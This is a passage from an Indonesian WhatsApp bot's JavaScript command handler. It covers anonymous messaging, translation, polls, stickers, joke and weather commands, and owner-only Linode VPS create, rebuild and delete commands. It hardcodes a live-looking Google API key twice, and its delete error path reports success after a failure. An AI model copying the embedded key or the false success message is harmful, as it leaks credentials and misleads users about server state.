"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": ``,
"sourceUrl": `${gr}`}}}, {quoted:kalgans})

await RezzHost.sendMessage(num, {text:`You can also reply to the message by sending a message, if you don't want to reply, please type .leave and enter send button`}, { quoted : kalgans })
lidt = `Success Sending Message
👤 From : wa.me/${nomor.split("@s.whatsapp.net")[0]}
👥 To : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}

⬡──⬡─────────⬡──⬡

Your Message : ${pesan}

⬡──⬡─────────⬡──⬡`
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(sender, num)
console.log("[ CONFESS ] Creating room for: " + sender);
return reply(lidt)
}
}
break
case 'translate': case 'tr': case 'tl': {
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m.quoted && m.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m.quoted.text
} else return m.reply(`Ex: ${prefix + command} id hello i am robot`)
const trans = require('@vitalets/google-translate-api')
await loading()
let res = await trans.translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return m.reply(`Error : Bahasa"${lang}" Tidak Support`)
m.reply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
}
break
case 'poll': {
if (!isCreator) return reply('ha?')
if (!text) throw `Example : ${prefix + command} Owner Ganteng|Iya|Tidak`
let poll1 = `${text.split("|")[1]}`
let poll2 = `${text.split("|")[2]}`
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `${text.split("|")[0]}`,
"options": [
	{
"optionName": poll1
	},
	{
"optionName": poll2
	}
],
"selectableOptionsCount": 2
	}
}), { userJid: m.chat})
RezzHost.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id})
}
break
case 'kapankah': {
                if (!q) return reply2(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
                const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
                const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                reply2(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
                }
            break
case 'bisakah': {
                if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
                const ga = bisa[Math.floor(Math.random() * bisa.length)]
                reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
                }
                break
case 'apakah': 
 if (!q) return reply2(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
RezzHost.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:kalgans })
	 
    break

        case 'bagaimanakah':
if (!q) return reply2(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
RezzHost.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:kalgans })
       break
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':
case 'attp':
if (isBan) return reply2(mess.ban)
await loading()
if (args.length == 0) return reply(`Example: ${prefix + command} Rezz Hosting`)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${apikey}&text=${ini_txt}`)
RezzHost.sendMessage(from, { sticker : ini_buffer }, { quoted:kalgans })
break
case 'wm': {
if (!q) return reply("Reply sticker dengan nama Punya|Gw")
if (isMedia || isQuotedImage|| isQuotedSticker) {
try{
let ahuh = args.join(' ').split('|')
let satu = ahuh[0] !== '' ? ahuh[0] : `${botName}`
let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: satu, // The pack name
author: dua, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
//await xm.sendMessage(from,{sticker: nah},{quoted: m})
RezzHost.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botname}`, mediaType: 3,  renderLargerThumbnail : true,jpegThumbnail: hst,sourceUrl: `https://wa.me/${owner}`
}}, sticker: nah }, { quoted: kalgans })   
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
console.log(err)
}
}
}
break
case 'wmvideo':{
if (isBan) return reply2(mess.ban)
await loading()
let teks = `${text}`
{
 if ((quoted.msg || quoted).seconds > 11) return reply2('Maksimal 10 detik!')
if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await RezzHost.sendVideoAsSticker(from, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
}
break
case 'faktaunik': {
var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)

let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: data.result
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *RerezBotz – New Version* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`${gris}[ F U N - F A C T ]${gris}\n`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"next\",\"id\":\".faktaunik\"}"
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'katabijak':
case 'pantun':
case 'bucin':
await loading()
var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
reply(data.result)
break
case 'quotes': {
var resi = await Quotes()
teks = `${resi.quotes}\n`

let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: teks
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *RerezBotz – New Version* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`${gris}[ Q U O T E S ]${gris}\n`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"next\",\"id\":\".quotes\"}"
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'emojimix': { 
if (isBan) return reply2(mess.ban)
await loading()
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await RezzHost.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'emojimix2': {
if (isBan) return reply2(mess.ban)
await loading()
 if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await RezzHost.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'infogempa': {
let dui = await fetchJson(`https://itzpire.site/information/gempaWarning`)
let du = dui.data
let caption = `${gris}[ I N F O - G E M P A ]${gris}\n\n`
caption += `Lokasi : ${du.lokasi}\n`
caption += `Tanggal : ${du.tanggal}\n`
caption += `Waktu : ${du.waktuPemutakhiran}\n`
caption += `Wilayah Dirasakan : ${du.wilayahDirasakan}\n`
caption += `Magnitude : ${du.magnitudo}\n`
caption += `Kedalaman : ${du.kedalaman}\n`
caption += `Arahan : ${du.arahan}\n`
caption += `Saran : ${du.saran}\n`
caption += `Koordinat : ${du.koordinat}\n\n`
RezzHost.sendMessage(from, { image: { url: du.linkPeta }, caption })
}
break
case 'tsunami': {
let tsu = await fetchJson(`https://itzpire.site/information/tsunamiWarning`)
let caption = `${gris}[ I N F O - T S U N A M I ]${gris}\n\n`
tsu.data.map((v, i) => {
caption += `${hiasan}Date : ${v.date}\n`
caption += `${hiasan}Time : ${v.time}\n`
caption += `${hiasan}Latitudo : ${v.latitude}\n`
caption += `${hiasan}Longitudo : ${v.longitude}\n`
caption += `${hiasan}Magnitudo : ${v.magnitude}\n`
caption += `${hiasan}Depth : ${v.depth}\n`
caption += `${hiasan}Location : ${v.location}\n`
caption += `${hiasan}Info : ${v.info}\n\n───────────────\n\n`
}).join('\n\n')
caption += `${footer2}`
reply2(caption) 
}
break
case 'cerpen2':
if (isBan) return reply2(mess.ban)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${apikey}`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
reply(textpp)
break
case 'ceritahoror':
if (isBan) return reply2(mess.ban)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
var caption = `Title : ${data.result.title}\n`
caption += `Desc : ${data.result.desc}\n`
caption += `Story :\n${data.result.story}\n`
RezzHost.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
break
case 'cuaca':
if (isBan) return reply2(mess.ban)
if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
var textppp = `Tempat : ${data.result.tempat}\n`
textppp += `Cuaca : ${data.result.cuaca}\n`
textppp += `Angin : ${data.result.angin}\n`
textppp += `Description : ${data.result.description}\n`
textppp += `Kelembapan : ${data.result.kelembapan}\n`
textppp += `Suhu : ${data.result.suhu}\n`
textppp += `Udara : ${data.result.udara}\n`
textppp += `Permukaan laut : ${data.result.permukaan_laut}\n`
RezzHost.sendMessage(from, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
reply(textppp)
break
case 'puisi':
reply(mess.search)
await sleep(1000)
axios.get(`https://api.lolhuman.xyz/api/random/puisi?apikey=${apikey}`).then(({ data }) => {
				reply(data.result)
			})
break
case 'randomnama':
reply(mess.search)
await sleep(1000)
axios.get(`https://api.lolhuman.xyz/api/random/nama?apikey=${apikey}`).then(({ data }) => {
				reply(data.result)
			})
break
case 'makermeme':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2(`Example = ${prefix+command} Lins Botz`)
reply(mess.wait)
await sleep(1000)
let photooxy = `https://api.lolhuman.xyz/api/meme5?apikey=${apikey}&text=${q}`
RezzHost.sendMessage(from, {image: { url: photooxy }, caption: `Hasil dari ${command}`}, { quoted: kalgans})
}
break
case 'besarkecil':
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example: ${prefix+command} Lins`)
reply(mess.wait)
await sleep(1000)
axios.get(`https://api.lolhuman.xyz/api/upperlower?apikey=${apikey}&text=${q}`).then(({ data }) => {
				reply(data.result)
			})
break
case 'nuliskiri': {
                if (args.length < 1) return m.reply(`Kirim perintah *${prefix}nuliskiri* teks`)
                m.reply(mess.wait)
                var tulisan = body.slice(11)
                var splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', ['./media/image/buku/sebelumkiri.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','22','-interline-spacing','2','-annotate','+140+153',fixHeight,'./media/image/buku/setelahkiri.jpg'])
                .on('error', () => m.reply(mess.error))
                .on('exit', () => {
                RezzHost.sendMessage(m.chat, { image: fs.readFileSync('./media/image/buku/setelahkiri.jpg')}, { quoted: kalgans, caption: `Jangan Malas Kak...`})
                })
             }
            break
            case 'nuliskanan': {
                if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
                m.reply(mess.wait)
                var tulisan = body.slice(12)
                var splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', ['./media/image/buku/sebelumkanan.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','2','-annotate','+128+129',fixHeight,'./media/image/buku/setelahkanan.jpg'])
                .on('error', () => m.reply(mess.error))
                .on('exit', () => {
                RezzHost.sendMessage(m.chat, { image: fs.readFileSync('./media/image/buku/setelahkanan.jpg')}, {quoted: kalgans, caption: `Jangan Malas Kak...`})
                })
              }
            break
            case 'foliokiri': {
                if (args.length < 1) return m.reply(`Kirim perintah *${prefix}foliokiri* teks`)
                m.reply(mess.wait)
                var tulisan = body.slice(11)
                var splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', ['./media/image/folio/sebelumkiri.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','1720x1280','-pointsize','23','-interline-spacing','4','-annotate','+48+185',fixHeight,'./media/image/folio/setelahkiri.jpg'])
                .on('error', () => m.reply(mess.error))
                .on('exit', () => {
                RezzHost.sendMessage(m.chat, { image: fs.readFileSync('./media/image/folio/setelahkiri.jpg')}, { quoted: kalgans, caption: `Jangan Malas Kak...`})
                })
             }
            break
            case 'foliokanan': {
                if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
                reply(mess.wait)
                var tulisan = body.slice(12)
                var splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', ['./media/image/folio/sebelumkanan.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','3','-annotate','+89+190',fixHeight,'./media/image/folio/setelahkanan.jpg'])
                .on('error', () => m.reply(mess.error))
                .on('exit', () => {
                RezzHost.sendMessage(m.chat, { image: fs.readFileSync('./media/image/folio/setelahkanan.jpg')}, {quoted: kalgans, caption: `Jangan Malas Kak...`})
                })
             }
break
case 'nulis':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example: ${prefix+command} Lins sedang turu`)
reply(mess.wait)
await sleep(1000)
let photooxy = `https://api.lolhuman.xyz/api/nulis?apikey=${apikey}&text=${q}`
RezzHost.sendMessage(from, {image: { url: photooxy }, caption: `Hasil dari ${command}`}, { quoted: kalgans})
}
break
case 'kodepos':
			if (args.length == 0) return reply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
			reply(mess.search)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/kodepos?apikey=${apikey}&query=${args[0]}`)
			var tittttttttttt = `Provinsi : ${data.result[0].province}\n`
			tittttttttttt += `Kabupaten : ${data.result[0].city}\n`
			tittttttttttt += `Kecamatan : ${data.result[0].subdistrict}\n`
			tittttttttttt += `Kelurahan : ${data.result[0].urban}\n`
			tittttttttttt += `Kode Pos : ${data.result[0].postalcode}`
			reply(tittttttttttt)
			break
case 'infocuaca':{
			if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
			reply(mess.search)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
			var titttttttttt = `Tempat : ${data.result.tempat}\n`
			titttttttttt += `Cuaca : ${data.result.cuaca}\n`
			titttttttttt += `Angin : ${data.result.angin}\n`
			titttttttttt += `Description : ${data.result.description}\n`
			titttttttttt += `Kelembapan : ${data.result.kelembapan}\n`
			titttttttttt += `Suhu : ${data.result.suhu}\n`
			titttttttttt += `Udara : ${data.result.udara}\n`
			titttttttttt += `Permukaan laut : ${data.result.permukaan_laut}\n`
			RezzHost.sendMessage(m.chat, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
			reply(titttttttttt)
			}
			break
case 'kbbi':{
			if (args.length == 0) return reply(`Example: ${prefix + command} kursi`)
			reply(mess.search)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/kbbi?apikey=${apikey}&query=${args[0]}`)
			var titid = `\`\`\`Kata : ${data.result[0].nama}\`\`\`\n`
			titid += `\`\`\`Kata Dasar : ${data.result[0].kata_dasar}\`\`\`\n`
			titid += `\`\`\`Pelafalan : ${data.result[0].pelafalan}\`\`\`\n`
			titid += `\`\`\`Bentuk Tidak Baku : ${data.result[0].bentuk_tidak_baku}\`\`\`\n\n`
			for (var x of data.result) {
				titid += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
				titid += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
				titid += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
				titid += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
				titid += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
			}
			reply(titid)
			}
			break
case 'jarak': {
var [me, to] = text.split`|`
	if (!(from && to)) return reply(`example ${prefix + command} Yogyakarta|Jakarta`)
	reply(mess.search)
	var data = await jarakkota(me, to)
	if (data.img) return RezzHost.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: kalgans })
}
break


// BATAS RANDOM MENU


// LINODE MENU





case 'deletelinode': {
  if (!isCreator) return reply2('Maaf, command ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply2('ID Linode belum diberikan.');

  let deleteLinode = async () => {
    try {
      let response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.status === 204) {
        reply('Linode berhasil dihapus.');
      } else {
        throw new Error('Gagal menghapus Linode.');
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus Linode:', error);
      reply('Sukses Menghapus Linode.');
    }
  };

  deleteLinode();

  break;
}
case 'sisalinode': {
  if (!isCreator) return reply(mess.owner);

  async function getLinodeInfo() {
    try {
      const response = await fetch('https://api.linode.com/v4/account', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`,
        },
      });

      if (response.ok) {
        const accountInfo = await response.json();
        const linodeLimit = accountInfo.data.active_promo?.total || 0;
        const linodesCount = accountInfo.data.active_promo?.remaining || 0;

        return {
          linodeLimit,
          remainingLinodes: linodesCount,
          totalLinodes: linodeLimit - linodesCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun Linode.');
      }
    } catch (error) {
      throw error;
    }
  }

  // Definisikan fungsi untuk mengeksekusi kasus "sisalinode"
  async function sisalinodeHandler() {
    try {
      if (!isCreator) {
        return reply('Lu Siapanya Gua Anjg');
      }

      const linodeInfo = await getLinodeInfo();
      reply(`*Sisa VPS Linode Yang Dapat Anda Buat: ${linodeInfo.remainingLinodes}*

*Total VPS Linode Yang Sudah Terbuat: ${linodeInfo.totalLinodes}*`);
    } catch (error) {
      reply(`Terjadi kesalahan: ${error.message}`);
    }
  }

  sisalinodeHandler();
  break;
}

            
            
case 'rebuildlinode': {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let password = args[1]; // Mengambil password dari argumen kedua (jika ada)
  if (!password) return reply('Password belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild VPS menggunakan API Linode
      const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        },
        body: JSON.stringify({
          image: 'linode/ubuntu20.04', // Ganti dengan ID atau label image yang ingin digunakan untuk rebuild
          root_pass: password // Menggunakan password yang diberikan
        })
      });

      if (response.ok) {
        reply('Rebuild VPS berhasil dimulai.');

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const ipAddress = vpsData.ipv4[0] || 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: Ubuntu 20.04\nPASSWORD: ${password}`;
          await sleep(60000);
          RezzHost.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.errors[0].reason);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error.message);
    }
  };

  rebuildVPS();
  break;
}

case 'linode8gb': {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-4', // Spesifikasi 8GB RAM 4 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await RezzHost.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
           
case 'linode16gb': {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-8',
      image: 'linode/ubuntu20.04',
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await RezzHost.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
case 'cekvpslinode': {
  if (!isCreator) return reply('Maaf, perintah ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  // Mendapatkan informasi VPS Linode berdasarkan ID
  const getLinodeInfo = async (linodeId) => {
    try {
      const apiUrl = `https://api.linode.com/v4/linode/instances/${linodeId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.ok) {
        const linodeInfo = await response.json();

        const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode
        const ram = `${linodeInfo.specs.memory / 1024} GB`; // RAM VPS dalam GB
        const os = linodeInfo.image.distribution; // Nama OS
        const cpu = `${linodeInfo.specs.vcpus} vCPUs`; // Jumlah vCPUs
        const storage = linodeInfo.specs.disk; // Kapasitas penyimpanan
        const status = linodeInfo.status; // Status VPS

        const createDate = new Date(linodeInfo.created); // Tanggal pembuatan VPS
        const formattedCreateDate = createDate.toLocaleDateString();

        return {
          linodeid: linodeInfo.id,
          label: linodeInfo.label,
          ip: ipAddress,
          ram,
          os,
          cpu,
          storage,
          status,
          createDate: formattedCreateDate
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail Linode: ${errorData.errors[0].reason}`);
      }
    } catch (error) {
      throw new Error(`Terjadi kesalahan saat memeriksa detail Linode: ${error.message}`);
    }
  };

  getLinodeInfo(linodeId)
    .then((info) => {
      let textku = `*DETAIL VPS LINODE*\nLinode Id: ${info.linodeid}\nLabel: ${info.label}\nIP: ${info.ip}\nRAM: ${info.ram}\nOS: ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus: ${info.status}\nCreate On: ${info.createDate}\n`;
      RezzHost.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      RezzHost.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS Linode.' });
    });

  break;
}


            

case 'linode2gb': {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-1', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
